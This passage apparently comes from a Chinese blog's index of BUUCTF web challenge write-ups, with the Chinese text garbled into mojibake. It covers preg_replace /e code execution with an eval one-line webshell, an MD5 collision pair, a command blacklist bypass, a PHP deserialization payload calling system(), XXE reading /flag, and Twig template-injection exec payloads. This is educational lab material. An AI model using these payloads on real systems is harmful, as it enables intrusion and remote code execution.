‡è¯†ç‰¹å®šç¼“å†²åŒºçš„ä¸€ä½æˆ–ä¸¤ä½åè¿›åˆ¶æ•°ã€‚å¯å˜å˜é‡ï¼šä¸‹é¢å†è¯´è¯´æˆ‘ä»¬ä¸ºä»€ä¹ˆè¦åŒ¹é…åˆ° {${phpinfo()}} æˆ–è€… ${phpinfo()} ï¼Œæ‰èƒ½æ‰§è¡Œ phpinfo å‡½æ•°ï¼Œè¿™æ˜¯ä¸€ä¸ªå°å‘ã€‚è¿™å®é™…ä¸Šæ˜¯ PHPå¯å˜å˜é‡ çš„åŸå› ã€‚åœ¨PHPä¸­åŒå¼•å·åŒ…è£¹çš„å­—ç¬¦ä¸²ä¸­å¯ä»¥è§£æå˜é‡ï¼Œè€Œå•å¼•å·åˆ™ä¸è¡Œã€‚ ${phpinfo()} ä¸­çš„ phpinfo() ä¼šè¢«å½“åšå˜é‡å…ˆæ‰§è¡Œï¼Œæ‰§è¡Œåï¼Œå³å˜æˆ ${1} (phpinfo()æˆåŠŸæ‰§è¡Œè¿”å›true)ã€‚ è¿™è¾¹æ¯”è¾ƒéš¾ç†è§£çš„åº”è¯¥æ˜¯è¿™ä¸ªåå‘å¼•ç”¨ï¼Œæ‰€ä»¥æˆ‘ç”¨äº†ä»£ç è°ƒè¯•ä¸€ä¸‹ï¼š 123è¿™é‡Œå…ˆé˜è¿°ä¸€ä¸‹æˆ‘çš„ç†è§£ï¼Œ\\1å¯ä»¥å‚¨å­˜è¡¨è¾¾å¼ï¼ŒpatternåŒ¹é…åˆ°çš„subjectçš„å†…å®¹å°†ä¼šè¢«å­˜å‚¨åœ¨strtolowerä¸­æ‰§è¡Œï¼Œæ‰€ä»¥æ­¤æ—¶æˆ‘ä»¬éœ€è¦åšçš„å°±æ˜¯çœ‹ä»€ä¹ˆæ ·çš„å‡½æ•°æ„é€ å½¢å¼å¯ä»¥åœ¨strtolower(&quot;&quot;)ä¸­æ‰§è¡Œï¼Œæ‰€ä»¥æ­¤æ—¶å¼•å…¥å¯å˜å˜é‡çš„çŸ¥è¯†ï¼Œä¸Šä¸€å…³çš„å¯å˜å˜é‡ä¸­ï¼Œæˆ‘ä»¬ç†è§£äº†$$aå®é™…ä¸Šæ˜¯å…ˆè§£ææ‰§è¡Œäº†$aè¿™é‡Œæˆ‘ä»¬å¼•å…¥${phpinfo()}ä¹Ÿæ˜¯è¿™ç§ç”¨å¤„ï¼Œæˆ‘ä»¬ä¼ å…¥è¿™ä¸ªå€¼æ¥ä¸‹æ¥å°±å˜æˆ$str=${phpinfo()}ä¹Ÿå°±æ˜¯$${phpinfo()}ï¼Œæ­¤æ—¶{phpinfo()}å°±ä¼šè¢«æ‰§è¡Œè¿”å›1ï¼Œå˜æˆ$1,è€Œä¸”éœ€è¦æ³¨æ„çš„æ˜¯ç”±äºè¿™é‡Œæ˜¯åŒå¼•å·æ‰å¯ä»¥è¿™æ ·è§£æï¼Œæ€»ç»“èµ·æ¥å°±æ˜¯ï¼š\\1ç¼“å­˜äº†æˆ‘ä»¬è¾“å…¥çš„è¡¨è¾¾â€”â€”&gt;è¯¥å‚æ•°å¯ä»¥ä»£ç æ‰§è¡Œâ€”â€”&gt;åŒå¼•å·å†…å˜é‡è§£æâ€”â€”&gt;å¼•å‘ä»£ç æ‰§è¡Œå˜é‡åpsï¼šè¿™é‡Œæˆ‘åœ¨æœ¬åœ°è¿è¡Œçš„æ—¶å€™å…¶å®{${}}æˆ–è€…${}éƒ½æ˜¯å¯ä»¥çš„ 123456var_dump(phpinfo()); // å¸ƒå°”truevar_dump(strtolower(phpinfo()));// å­—ç¬¦ä¸²'1',phpinfoæ‰§è¡ŒæˆåŠŸè¿”å›1ï¼Œå°†1å°å†™var_dump(preg_replace('/(.*)/ie','1','{${phpinfo()}}'));//å­—ç¬¦ä¸²'11'var_dump(preg_replace('/(.*)/ie','strtolower(&quot;\\\\1&quot;)','{${phpinfo()}}'));// ç»“æœï¼šç©ºå­—ç¬¦ä¸²''var_dump(preg_replace('/(.*)/ie','strtolower(&quot;{${phpinfo()}}&quot;)','{${phpinfo()}}'));// ç»“æœï¼šç©ºå­—ç¬¦ä¸²''è¿™é‡Œçš„'strtolower(&quot;{${phpinfo()}}&quot;)'æ‰§è¡Œåç›¸å½“äº strtolower(&quot;{${1}}&quot;) åˆç›¸å½“äº strtolower(&quot;{null}&quot;) åˆç›¸å½“äº '' ç©ºå­—ç¬¦ä¸² æ¥ä¸‹æ¥è¿˜æœ‰ä¸€ä¸ªéš¾ç‚¹ï¼Œå°±æ˜¯æ­£åˆ™åŒ¹é…å¼ä¸­åŒ¹é…è¯­å¥è¯¥å¦‚ä½•ä¹¦å†™å‘¢ï¼Ÿï¼š . åŒ¹é…é™¤æ¢è¡Œç¬¦ä»¥å¤–çš„ä»»æ„å­—ç¬¦ \\s åŒ¹é…ä»»æ„çš„ç©ºç™½ç¬¦ \\S åŒ¹é…ä»»ä½•éç©ºç™½å­—ç¬¦ + åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼ä¸€æ¬¡æˆ–å¤šæ¬¡ ä½†æ˜¯è¿™é‡Œæ— æ³•ä½¿ç”¨. å› ä¸ºphpçš„è§£æç‰¹æ€§ï¼Œä¼šè¢«è½¬ä¹‰æˆ_å°±æ”¹å˜æ¥åŸæ¥æˆ‘ä»¬æƒ³è¦çš„æ•ˆæœï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦çš„æ˜¯\\S*ç”±äºè¿™é‡Œæ˜¯evalå‡½æ•°æ‰§è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥æ„é€ ä¸€å¥è¯æœ¨é©¬ï¼š payload: 1?\\S*={${eval($_POST['1'])}","link":"/2021/04/01/buuctf6/"},{"title":"buuctf7","text":"[å®‰æ´µæ¯ 2019]easy_webçœ‹åˆ°imgçš„åé¢åƒbase64ï¼Œè§£å¯†ä¸¤æ¬¡åå†ç»è¿‡hexè§£å¯†ï¼Œå¾—åˆ°ä¸€ä¸ªæ–‡ä»¶åç§°ï¼Œäºæ˜¯å°è¯•è¯»å–index.phpæºç ï¼Œhex-&gt;base64-&gt;base64 æŠ“åŒ…åœ¨cmdä¸Šåšæ‰‹è„šï¼Œå‘ç°ä¼ å…¥æ•°ç»„ç±»å‹çš„æ—¶å€™ï¼Œæœ‰å›æ˜¾arrayï¼Œè¿™ä¸ªæ—¶å€™æ€»è§‰å¾—æœ‰ç‚¹å‡½æ•°åµŒå¥—é‚£å‘³äº† 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phperror_reporting(E_ALL || ~ E_NOTICE);header('content-type:text/html;charset=utf-8');$cmd = $_GET['cmd'];if (!isset($_GET['img']) || !isset($_GET['cmd'])) header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=');$file = hex2bin(base64_decode(base64_decode($_GET['img'])));$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);if (preg_match(&quot;/flag/i&quot;, $file)) { echo '&lt;img src =&quot;./ctf3.jpeg&quot;&gt;'; die(&quot;xixiÃ¯Â½Â no flag&quot;);} else { $txt = base64_encode(file_get_contents($file)); echo &quot;&lt;img src='data:image/gif;base64,&quot; . $txt . &quot;'&gt;&lt;/img&gt;&quot;; echo &quot;&lt;br&gt;&quot;;}echo $cmd;echo &quot;&lt;br&gt;&quot;;if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\'|\\&quot;|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|{|}|\\(|\\)|-|&lt;|&gt;/i&quot;, $cmd)) { echo(&quot;forbid ~&quot;); echo &quot;&lt;br&gt;&quot;;} else { if ((string)$_POST['a'] !== (string)$_POST['b'] &amp;&amp; md5($_POST['a']) === md5($_POST['b'])) { echo `$cmd`; } else { echo (&quot;md5 is funny ~&quot;); }}?&gt;&lt;html&gt;&lt;style&gt; body{ background:url(./bj.png) no-repeat center center; background-size:cover; background-attachment:fixed; background-color:#CCCCCC;}&lt;/style&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; åˆæ˜¯md5çš„äº‹æƒ…ï¼Œç›´æ¥è¿›äº† md5ç¢°æ’ï¼š 1a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2&amp;= åœ¨linuxç³»ç»Ÿä¸­: 123cat /flagca\\t /fla\\g æ˜¯ç­‰ä»·çš„ä¸ºä»€ä¹ˆç­‰ä»·å‘¢ï¼Ÿåœ¨linuxç³»ç»Ÿä¸­è¿™ä¸ªåæ–œçº¿å¯ä»¥ä½¿å‘½ä»¤æ¢è¡Œï¼Œå’Œæˆ‘ä»¬ä¹‹å‰çš„é¢˜ç›®æ˜¯ä¸€ä¸ªæ„æ€å•¦ã€‚ã€‚ã€‚ [ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpwebé¡µé¢ä¸€ç›´åœ¨åˆ·æ–°ï¼Œè·¯å¾„ä¹ŸçŸ¥é“äº†ï¼Œå…ˆæŠ“ä¸ªåŒ…çœ‹çœ‹,å‘ç°å¯ä»¥æäº¤è¡¨å•ï¼Œç„¶åç”¨äº†call_user_funcè¿™ä¸ªå±é™©å‡½æ•°ï¼šcall_user_func â€” æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°è°ƒç”¨ä½¿ç”¨file_get_contentsæŸ¥çœ‹index.phpæºç  123456789101112131415161718192021222324252627282930&lt;?php $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;, &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;); function gettime($func, $p) { $result = call_user_func($func, $p); $a= gettype($result); if ($a == &quot;string&quot;) { return $result; } else {return &quot;&quot;;} } class Test { var $p = &quot;Y-m-d h:i:s a&quot;; var $func = &quot;date&quot;; function __destruct() { if ($this-&gt;func != &quot;&quot;) { echo gettime($this-&gt;func, $this-&gt;p); } } } $func = $_REQUEST[&quot;func&quot;]; $p = $_REQUEST[&quot;p&quot;]; if ($func != null) { $func = strtolower($func); if (!in_array($func,$disable_fun)) { echo gettime($func, $p); }else { die(&quot;Hacker...&quot;); } } ?&gt; æœç„¶åœ¨ä¸€æ¡è·¯ä¸Šå¡å¤ªä¹…åº”è¯¥ç§¯æè½¬åŒ–æ€è·¯ï¼Œå½“æˆ‘è‹¦è‹¦æœç´ æ‰‹å†Œæ— æœçš„æ—¶å€™ï¼Œæœ€ç»ˆé€‰æ‹©æ‰“å¼€äº†wpï¼ŒåŸæ¥å¯ä»¥åˆ©ç”¨ååºåˆ—åŒ–æ¥è§£é¢˜ï¼š 12345678910111213141516171819&lt;?phpfunction gettime($func, $p) { $result = call_user_func($func, $p); $a= gettype($result); if ($a == &quot;string&quot;) { return $result; } else {return &quot;&quot;;}}class Test { var $p = &quot;cat $(find / -name flag*)&quot;; var $func = &quot;system&quot;; function __destruct() { if ($this-&gt;func != &quot;&quot;) { echo gettime($this-&gt;func, $this-&gt;p); } }}$a=new Test();print(serialize($a)); è¿™é‡Œæœ‰ä¸€ç‚¹éœ€è¦è¯´æ˜çš„æ˜¯ï¼Œevalä¸æ˜¯å‡½æ•°æ‰€ä»¥è¿™é‡Œçš„call_user_funcå°±ä¸é€‚ç”¨äº†ï¼Œæ‰€ä»¥é€‰æ‹©systemæ¥æ„é€ payloadï¼Œä¸è¿‡è¿™ä¸ªæ‹¿åˆ°flagçš„è¯­å¥ä¹Ÿæ˜¯è®©æˆ‘çœ¼å‰ä¸€äº® [De1CTF 2019]SSRF Me123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108#! /usr/bin/env python#encoding=utf-8from flask import Flaskfrom flask import requestimport socketimport hashlibimport urllibimport sysimport osimport jsonreload(sys)sys.setdefaultencoding('latin1')app = Flask(__name__)secert_key = os.urandom(16)class Task: #pythonè¿™é‡Œåº”è¯¥æŒ‡çš„å°±æ˜¯ä½¿ç”¨çš„å‡½æ•°å§ï¼ŒæŒ‰ç…§è¿™ä¸ªé€»è¾‘ä¸‹å»ï¼Œé¦–å…ˆæ˜¯actionã€ç„¶åæ˜¯paramã€‚ã€‚ã€‚ã€‚ def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if(not os.path.exists(self.sandbox)): #SandBox For Remote_Addr os.mkdir(self.sandbox)#åœ¨ä¸Šé¢å¯¹èµ‹å€¼å®Œæˆçš„å†…å®¹ä¼ å…¥Execä¸­è¿›è¡Œæ‰§è¡Œ def Exec(self): result = {} result['code'] = 500 #ä½¿ç”¨checkSign()ï¼Œè¿›è¡Œè·Ÿè¸ªçœ‹çœ‹ if (self.checkSign()): if &quot;scan&quot; in self.action: tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, 'w') resp = scan(self.param) if (resp == &quot;Connection Timeout&quot;): result['data'] = resp else: print resp tmpfile.write(resp) tmpfile.close() result['code'] = 200 if &quot;read&quot; in self.action: f = open(&quot;./%s/result.txt&quot; % self.sandbox, 'r')#çœŸçš„è¯»å–ç‚¹åœ¨è¿™ï¼ result['code'] = 200 result['data'] = f.read() if result['code'] == 500: result['data'] = &quot;Action Error&quot; else: result['code'] = 500 result['msg'] = &quot;Sign Error&quot; return result#æ¥åˆ°è¿™é‡Œï¼Œä½¿ç”¨getSign()å‡½æ•°ï¼Œçœ‹çœ‹æ˜¯å¦å’Œself.sign=signç›¸ç­‰ def checkSign(self): if (getSign(self.action, self.param) == self.sign): return True else: return False#generate Sign For Action Scan.#ä¸‡ç‰©çš„èµ·ç‚¹åœ¨è¿™é‡Œï¼ï¼ï¼ï¼ï¼ï¼@app.route(&quot;/geneSign&quot;, methods=['GET', 'POST'])def geneSign(): param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) action = &quot;scan&quot; #è¿™é‡Œè¿›è¡Œå’Œç§˜é’¥çš„æ‹¼æ¥åmd5çš„åŠ å¯†ä¼ å›å€¼ return getSign(action, param)#ä¸‡ç‰©çš„èµ·ç‚¹è¿˜æœ‰è¿™é‡Œï¼ï¼ï¼ï¼ï¼ï¼@app.route('/De1ta',methods=['GET','POST'])def challenge(): action = urllib.unquote(request.cookies.get(&quot;action&quot;)) param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) #è¿™é‡Œæ˜¯ä»cookieä¼ å›sign sign = urllib.unquote(request.cookies.get(&quot;sign&quot;)) ip = request.remote_addr #æœ‰ä¸ªwaf if(waf(param)): return &quot;No Hacker!!!!&quot; task = Task(action, param, sign, ip) return json.dumps(task.Exec())#è¿™é‡Œï¼ï¼ï¼ï¼ï¼ï¼ï¼Œä»¥ä¸‹å°±æ˜¯æˆ‘ä»¬çš„åˆå§‹é¡µé¢äº†@app.route('/')def index(): return open(&quot;code.txt&quot;,&quot;r&quot;).read()#è¿™é‡Œæ¥ä¸ªåˆ†å‰²çº¿def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50]#æ„Ÿè§‰è¿™é‡Œå¯ä»¥è¯»æ–‡ä»¶æ¥ç€ except: return &quot;Connection Timeout&quot;#å¯¹ä¼ å…¥çš„å†…å®¹ä¹Ÿå°±æ˜¯secert_key+param+actionè¿›è¡ŒåŠ å¯†def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest()#æ¥åˆ°md5è¿›è¡ŒåŠ å¯†ï¼Œå¹¶è¿”å›å€¼def md5(content): return hashlib.md5(content).hexdigest()def waf(param): check=param.strip().lower() if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;): return True else: return Falseif __name__ == '__main__': app.debug = False app.run(host='0.0.0.0',port=80) pythonä»£ç å®¡è®¡:åœ¨python2.7ä¸­è·‘ï¼Œæƒ³è¯´ç”¨debugäº†è§£ä¸€ä¸‹æ•´ä¸ªä»£ç çš„è¿è¡Œé€»è¾‘ï¼Œä½†æ˜¯è·³æ¥è·³å»çš„ï¼Œå®åœ¨çœ‹ä¸æ˜ç™½ï¼Œå¯èƒ½æ˜¯ç”±äºéƒ½æ˜¯ç”±defçš„å‡½æ•°å½¢å¼ï¼Œæ‰€ä»¥æ‰“ç®—å»çœ‹çœ‹å¦‚ä½•å®¡è®¡æ­¤ç±»ä»£ç :å¤§æ¦‚è¿›ç¨‹å°±æ˜¯å¦‚ä¸Šæ‰€ç¤ºï¼Œæ¥ä¸‹æ¥è¦è€ƒè™‘çš„å°±æ˜¯æ¼æ´åœ¨å“ªé‡Œï¼Œæ€è·¯éƒ½å†™åœ¨ä¸Šé¢äº†ï¼Œç°åœ¨ä¼ å€¼çœ‹çœ‹ï¼šæ²¡æœ‰ååº”ï¼Œå¯†é’¥éƒ½æ²¡æœ‰æˆ‘ä¼ ä¸ªé¬¼â€“ï¼Œå­¦ä¹ äº†è·¯ç”±çš„çŸ¥è¯†åï¼Œå‘ç°å…¶å®ä¸æ­¢index.phpä¸€ä¸ªå…¥å£è¿˜æœ‰geneSign è¿˜æœ‰De1taå…¥å£ï¼Œè¿™é‡Œ æ ¹æ®æç¤ºï¼Œä¼ å…¥flag.txtæŸ¥çœ‹åˆ°å¯†é’¥ 11ae9809211e47b0157b8ea5a0f0b8f55 (è¿™é‡Œä¸æ˜¯å¾ˆæ‡‚ä¸ºå•¥èƒ½æŸ¥çœ‹åˆ°å¯†é’¥ï¼Ÿä¹Ÿæ²¡æœ‰ç›¸å…³ä»£ç å‘€ï¼Œæ˜¯æˆ‘çœ‹å¾—ä¸å¤Ÿä»”ç»†å—)ï¼Œè¢«wpç»™è¯¯å¯¼äº†ï¼Œå…¶å®ä¹Ÿä¸ç®—è¯¯å¯¼ï¼Œåº”è¯¥æ˜¯æˆ‘ç†è§£é”™äº†è¿™é‡Œé‡æ–°ç†ä¸€ä¸‹æ€è·¯:å…¶å®è¿™é‡Œä¸»è¦ç»•è¿‡çš„å°±æ˜¯ä¸€ä¸ªchecksignå‡½æ•°å’Œä¸€ä¸ªwafå‡½æ•°checkå‡½æ•°éœ€è¦æ¯”å¯¹çš„å†…å®¹æ˜¯å°†paramå’Œactionä»¥åŠå¯†é’¥è¿›è¡Œæ‹¼æ¥ï¼Œå†ä¸æˆ‘ä»¬ä¼ å…¥çš„signè¿›è¡Œæ¯”å¯¹ï¼Œä½†æ˜¯é—®é¢˜åœ¨äºï¼Œæˆ‘ä»¬æ²¡æœ‰å¯†é’¥ï¼Œæ‰€ä»¥è§£é¢˜çš„å…³é”®å°±åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬çŸ¥é“flagåœ¨flag.txtæ–‡ä»¶ä¸­ï¼Œè€Œåœ¨genesignä¸­ å¦‚æœæˆ‘ä»¬ä¼ å…¥flag.txté‚£ä¹ˆè¿”å›çš„å†…å®¹å³ä¸ºsecret_key+flag.txtscançš„md5åŠ å¯†ï¼Œä½†æ˜¯åé¢çš„actionåªèƒ½æ˜¯scanä¼šä¸ä¼šæœ‰å½±å“å‘¢ï¼Ÿå…¶å®ä¸ä¼šçš„ï¼Œå› ä¸ºè¿™ä¹Ÿæ˜¯æˆ‘ä»¬æ‰€éœ€è¦çš„ï¼Œè¿›å…¥åˆ°execå‡½æ•°ä¸­ï¼Œå…¶å®æœ‰ä¸¤ä¸ªåˆ¤æ–­ï¼Œä¸€ä¸ªæ˜¯readä¸€ä¸ªæ˜¯scanï¼Œå½“æˆ‘ä»¬åœ¨scanå‰åŠ ä¸Šreadï¼Œé‚£ä¹ˆåˆ¤æ–­å°±ä¼šè¿›å…¥readå½“ä¸­ï¼Œå³å¯ä½¿ç”¨read()å‡½æ•°æ‰“å¼€flag.txtäº†æ•‘å‘½ï¼Œç»ˆäºæœ‰ä¸ä¸€æ ·çš„å›æ˜¾äº†ï¼ æœ€ç»ˆpayload","link":"/2021/04/08/buuctf7/"},{"title":"buuctf8","text":"[NCTF2019]Fake XML cookbookå­¦ä¹ å®Œxmlçš„è¯­æ³•ä»¥åï¼Œå†å»çœ‹ä¸€ä¸‹xmlå®ä½“æ³¨å…¥çš„ä¾‹å­ï¼Œæ„Ÿè§‰å°±ç†è§£çš„æ¯”è¾ƒå¿«äº† å…¶å®å°±æ˜¯åœ¨å¤–éƒ¨å£°æ˜DTDå®ä½“ï¼Œç„¶åç›´æ¥å¼•ç”¨ 1234&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE xxe [ &lt;!ENTITY chybeta &quot;Hello World!&quot;&gt; &lt;!--å¼•ç”¨å¯¹è±¡ä¸ºchybeta--&gt;]&gt; 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE xxe [ &lt;!ENTITY t SYSTEM &quot;file:///flag&quot;&gt; ]&gt;&lt;user&gt;&lt;username&gt;&amp;t;&lt;/username&gt;&lt;!--&lt;/username&gt;&lt;password&gt;ad&lt;/password&gt;&lt;/user&gt;--&gt;&lt;/user&gt; ç›´æ¥è¯»å–flag è¿™é‡Œè´´ä¸€ä¸‹æ ¼å¼: 1&lt;!ENTITY å®ä½“åç§° SYSTEM &quot;URI&quot;&gt; é’ˆå¯¹xmlæ³¨å…¥å¯ä»¥å­¦ä¹ :https://chybeta.github.io/2017/07/04/%E5%B0%8F%E8%AF%95XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/ [ASIS 2019]Unicorn shopè¿™é¢˜è€ƒçš„ä¸æ˜¯å¾ˆæ˜ç™½ï¼Œå¤§è‡´å°±æ˜¯ä¹°ç‹¬è§’å…½ï¼ŒæŸ¥çœ‹æºç ï¼Œåœ¨utf-8æ—è¾¹æœ‰æç¤ºï¼Œè¯´è¿™ä¸ªç¼–ç é—®é¢˜å¾ˆé‡è¦ç„¶åä¹°å‰ä¸‰åªçš„å›æ˜¾å’Œæœ€åä¸€åªä¸åŒï¼Œæœ€åä¸€åªç”¨ä¸€ä¸ªå­—ç¬¦ä¹°è¯´é’±ä¸å¤Ÿï¼Œç”¨å¤šä¸ªå­—ç¬¦ è¯´åªèƒ½ä½¿ç”¨ä¸€ä¸ªå­—ç¬¦ï¼Œäºæ˜¯çœ‹çœ‹æœ‰æ²¡æœ‰ä¸€ä¸ªå­—ç¬¦è¡¨ç¤ºçš„æ•°å­—å¾ˆå¤§çš„:https://www.compart.com/en/unicode/U+137C è¿™ä¸ªç½‘å€å¯ä»¥æŸ¥è¯¢ï¼šæœ€åå°†0xæ¢æˆ%å°±è¡Œã€‚ [BJDCTF2020]Cookie is so stableåƒæ¨¡æ¿æ³¨å…¥ï¼Œäºæ˜¯å°è¯•è¾“å…¥ 1{{1*3}}//å›æ˜¾ä¸º3 ä½†æ˜¯è¾“å…¥ 1{{..}} ä¸è®ºè¾“å…¥ä»€ä¹ˆå­—ç¬¦éƒ½ç›´æ¥è¢«è¿‡æ»¤ï¼Œçœ‹ä¸€ä¸‹æ˜¯ä»€ä¹ˆæ¨¡æ¿å†å¯¹ç—‡ä¸‹è¯å§ï¼šéªŒè¯ 1{{1*'3'}} å‘ç°æ˜¯twigæ¨¡æ¿æ³¨å…¥ï¼Œå…¶æ”»å‡»è¯­å¥åˆå’Œæ·³æœ´çš„flaskæ¡†æ¶ä¸åŒï¼Œæ„é€ æ–¹å¼: 123{{_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)}}{{_self.env.getFilter(&quot;id&quot;)}} 1{{_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)}}{{_self.env.getFilter(&quot;cat /flag&quot;)}} [CISCN 2019 åˆèµ›]Love MathPHPå‡½æ•°ï¼š scandir() å‡½æ•°ï¼šè¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚base_convert() å‡½æ•°ï¼šåœ¨ä»»æ„è¿›åˆ¶ä¹‹é—´è½¬æ¢æ•°å­—ã€‚dechex() å‡½æ•°ï¼šæŠŠåè¿›åˆ¶è½¬æ¢ä¸ºåå…­è¿›åˆ¶ã€‚hex2bin() å‡½æ•°ï¼šæŠŠåå…­è¿›åˆ¶å€¼çš„å­—ç¬¦ä¸²è½¬æ¢ä¸º ASCII å­—ç¬¦(æ­¤æ—¶å°±å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼)ã€‚var_dump() ï¼šå‡½æ•°ç”¨äºè¾“å‡ºå˜é‡çš„ç›¸å…³ä¿¡æ¯ã€‚readfile() å‡½æ•°ï¼šè¾“å‡ºä¸€ä¸ªæ–‡ä»¶ã€‚è¯¥å‡½æ•°è¯»å…¥ä¸€ä¸ªæ–‡ä»¶å¹¶å†™å…¥åˆ°è¾“å‡ºç¼“å†²ã€‚è‹¥æˆåŠŸï¼Œåˆ™è¿”å›ä»æ–‡ä»¶ä¸­è¯»å…¥çš„å­—èŠ‚æ•°ã€‚è‹¥å¤±è´¥ï¼Œåˆ™è¿”å› falseã€‚æ‚¨å¯ä»¥é€šè¿‡ @readfile() å½¢å¼è°ƒç”¨è¯¥å‡½æ•°ï¼Œæ¥éšè—é”™è¯¯ä¿¡æ¯ã€‚è¯­æ³•ï¼šreadfile(filename,include_path,context) 12345678910111213141516171819202122232425262728&lt;?phperror_reporting(0);//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flagif(!isset($_GET['c'])){ show_source(__FILE__);}else{ //ä¾‹å­ c=20-1 $content = $_GET['c']; if (strlen($content) &gt;= 80) { die(&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;); } $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '&quot;', '`', '\\[', '\\]']; foreach ($blacklist as $blackitem) { if (preg_match('/' . $blackitem . '/m', $content)) { die(&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;); } } //å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh']; preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs); foreach ($used_funcs[0] as $func) { if (!in_array($func, $whitelist)) { die(&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;); } } //å¸®ä½ ç®—å‡ºç­”æ¡ˆ eval('echo '.$content.';');} ç†ä¸€ä¸‹æ€è·¯:é¦–å…ˆä»–è¯´å­—ç¬¦é•¿åº¦ä¸èƒ½è¶…è¿‡80ï¼Œå…¶æ¬¡åªèƒ½ä½¿ç”¨ç™½åå•å†…çš„å‡½æ•°ï¼Œæ‰€ä»¥è¿™é¢˜çš„è§£é¢˜æ–¹å‘é¦–å…ˆåº”è¯¥æ˜¯éœ€è¦ä½¿ç”¨$_GETä¹‹ç±»çš„å‡½æ•°è¿›è¡Œä¼ å‚ï¼Œå¹¶ä¸”è¦å¯¹è¿™äº›å‡½æ•°åšè¿›åˆ¶è½¬åŒ–ã€‚ä¸€æ­¥ä¸€æ­¥æ¥å§,é¦–å…ˆæ˜¯ 1c=system('cat /flag') å¯¹äºå‡½æ•°ï¼Œå¯ä»¥åˆ©ç”¨åŠ¨æ€å‡½æ•°çš„æ€§è´¨ï¼Œå³å­—ç¬¦ä¸²åšå‡½æ•°åï¼ŒåŠ 